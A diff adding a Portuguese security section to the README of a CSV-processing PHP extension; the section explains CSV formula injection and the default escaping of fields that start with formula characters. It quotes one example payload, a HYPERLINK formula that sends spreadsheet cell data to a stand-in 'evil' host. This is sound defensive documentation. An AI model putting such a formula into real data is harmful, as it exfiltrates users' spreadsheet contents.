@@ -637,6 +637,29 @@ try {
 
 O parsing segue RFC 4180 via crate [`csv`](https://docs.rs/csv/): campos entre aspas (`"..."`), delimitador embutido dentro de aspas, aspas escapadas (`""`), e `CRLF`/`LF` são tratados corretamente. Na saída, `csv::Writer` re-quota automaticamente campos que contenham o delimitador configurado ou aspas. O terminador de linha da saída é sempre `\n`.
 
+## Segurança
+
+### CSV formula injection
+
+RFC 4180 não cobre o problema de planilhas (Excel/Sheets/Calc) interpretarem como fórmula qualquer campo que comece com `=`, `+`, `-`, `@`, `\t` ou `\r`. Um CSV derivado de dados externos pode carregar payloads tipo `=HYPERLINK("http://evil/?x="&A1,"clique")` que exfiltram dados da planilha quando abertos pelo usuário final.
+
+A extensão neutraliza isso por default: todo campo de saída que começar com um desses caracteres recebe o prefixo `'` (aspas simples), o que faz a planilha tratar o conteúdo como texto. O parâmetro `$escapeFormulas` das assinaturas `processFile` e `processChunks` é opcional e defaulta para `true`:
+
+```php
+// Seguro por default (escape ativo)
+$processor->processChunks($dir, $n, ';', ';', false, $layout);
+
+// Opt-in explícito
+$processor->processChunks($dir, $n, ';', ';', false, $layout, true);
+
+// Opt-out (APENAS para pipelines internos onde a saída NUNCA abre em planilha)
+$processor->processChunks($dir, $n, ';', ';', false, $layout, false);
+```
+
+A validação (`validate`) roda sobre o valor **antes** do escape, então CPFs/CNPJs/regex continuam funcionando como esperado — um CPF válido não fica inválido por receber prefixo depois.
+
+Veja [OWASP — CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) para contexto.
+
 ---
 
 ## Troubleshooting
